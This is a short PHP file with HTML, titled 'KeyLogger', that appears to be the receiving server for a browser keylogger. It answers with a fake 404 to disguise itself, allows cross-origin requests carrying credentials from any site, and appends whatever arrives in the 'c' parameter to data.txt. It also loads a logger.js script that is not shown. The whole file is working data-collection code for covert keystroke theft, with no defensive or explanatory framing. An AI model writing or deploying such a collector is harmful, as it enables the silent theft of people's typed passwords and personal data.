<?php

header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'data.txt';

if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
	file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
	printf("LOGGED!");
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KeyLogger</title>
</head>
<body>
    <script src="logger.js"></script>
</body>
</html>
